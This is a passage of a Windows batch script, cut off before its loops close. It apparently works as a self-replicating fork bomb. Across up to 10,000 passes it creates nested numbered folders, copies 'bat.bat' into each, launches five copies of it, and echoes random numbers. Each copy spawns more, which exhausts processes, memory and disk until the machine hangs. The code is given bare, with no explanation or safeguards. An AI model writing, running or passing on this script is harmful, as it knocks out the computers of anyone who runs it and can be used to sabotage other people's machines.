for /l %%i in (1,1,10000) do (
 md %%i
 cd %%i
 copy "..\bat.bat"
 for /l %%i in (1,1,5) do (
  start bat.bat
 )
 cd..
 for /l %%i in (1,1,5) do (
  echo %random% %random% %random% %random% %random% %random% %random% %random% %random%